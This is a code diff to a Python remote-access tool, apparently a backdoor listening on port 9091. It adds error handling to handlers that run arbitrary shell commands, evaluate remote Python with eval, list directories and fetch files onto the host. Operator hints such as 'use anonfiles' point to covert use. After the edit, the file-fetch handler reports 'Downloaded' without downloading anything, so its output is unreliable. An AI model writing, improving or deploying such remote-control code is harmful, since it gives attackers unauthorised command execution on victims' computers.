@@ -1,7 +1,7 @@
 #Imports
+import os
 import socket
 import sys
-import unicodedata
 import subprocess
 from subprocess import PIPE, Popen
 
@@ -15,15 +15,23 @@ port = 9091
 #CMDS
 def shellcmd(args):
     cmd = args[1]
-    output = subprocess.check_output(cmd, shell=True)
+    
+    try:
+        output = subprocess.check_output(cmd, shell=True)
+    except:
+        print("error in shellcmd (fix your windows shell command)")
+        output = "error"
     print(output)
     return output
     
 def uploadfilewww(args):
     url = args[1]
     location = args[2]
-    wget.download(url,out=location)
-    output = "Downloaded " + url + " to " + location
+    try:
+        output = "Downloaded " + url + " to " + location
+    except:
+        print("error in uploadfilewww (use anonfiles and copy download link)")
+        output = "error"
     return output
 
 def osname(args):
@@ -33,7 +41,11 @@ def osname(args):
 def listdirectory(args):
     print("listing directories")
     dir = args[1]
-    output = "listed directories"
+    try:
+        output = os.listdir(dir)
+    except:
+        print("error in list directory")
+        output = "error"
     return output
 
 def remexec(args):
@@ -43,7 +55,8 @@ def remexec(args):
     try:
         output = eval(remcode)
     except:
-        print("except error in remote exec")
+        print("except error in remote exec (fix your python command)")
+        output = "error"
     print(str(output))
     return str(output)
     
